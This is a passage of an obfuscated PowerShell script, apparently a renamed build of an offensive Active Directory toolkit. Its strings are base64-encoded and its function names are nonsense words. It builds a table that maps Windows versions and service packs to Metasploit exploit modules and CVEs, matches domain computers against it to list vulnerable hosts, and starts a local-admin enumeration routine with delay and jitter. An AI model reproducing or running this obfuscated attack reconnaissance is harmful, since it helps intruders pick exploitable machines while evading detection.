    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAGgAZQBjAGsAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGYAbwByACAAdgB1AGwAbgBlAHIAYQBiAGwAZQAgAE8AUwAgAGEAbgBkACAAUwBQACAAbABlAHYAZQBsAHMALgAuAC4A')))
    $TableVulnComputers = New-Object System.Data.DataTable 
    $Null = $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
    $Null = $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A'))))
    $Null = $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
    $Null = $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA'))))
    $Null = $TableVulnComputers.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA'))))
    $TableExploits | % {
        $ExploitOS = $_.OperatingSystem
        $ExploitSP = $_.ServicePack
        $ExploitMsf = $_.MsfModule
        $ExploitCVE = $_.CVE
        $TableAdsComputers | % {
            $AdsHostname = $_.Hostname
            $AdsOS = $_.OperatingSystem
            $AdsSP = $_.ServicePack                                                        
            $AdsLast = $_.LastLogon
            if ($AdsOS -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAHgAcABsAG8AaQB0AE8AUwAqAA=='))) -and $AdsSP -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABFAHgAcABsAG8AaQB0AFMAUAA='))) ) {                    
                $Null = $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,$AdsLast,$ExploitMsf,$ExploitCVE)
            }
        }
    }     
    $VulnComputer = $TableVulnComputers | select ComputerName -Unique | measure
    $VulnComputerCount = $VulnComputer.Count
    if ($VulnComputer.Count -gt 0) {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABGAG8AdQBuAGQAIAAkAFYAdQBsAG4AQwBvAG0AcAB1AHQAZQByAEMAbwB1AG4AdAAgAHAAbwB0AGUAbgB0AGkAYQBsAGwAeQAgAHYAdQBsAG4AZQByAGEAYgBsAGUAIABzAHkAcwB0AGUAbQBzACEA')))
        $TableVulnComputers | sort { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABOAG8AIAB2AHUAbABuAGUAcgBhAGIAbABlACAAcwB5AHMAdABlAG0AcwAgAHcAZQByAGUAIABmAG8AdQBuAGQALgA=')))
    }
}
function CanthousSwingElandy {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $OutFile,
        [Switch]
        $NoClobber,
        [Switch]
        $TrustGroups,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        $RandNo = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBFAG4AdQBtAGUAcgBhAHQAZQBMAG8AYwBhAGwAQQBkAG0AaQBuACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [array]$ComputerName = @()
            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                $TargetDomains = MegatedJuloInternate | % { $_.Name }
            }
            else {
                $TargetDomains = @( (PrectusEmbakedTects).name )
            }
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += GrochoniIncunnerMoustic -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
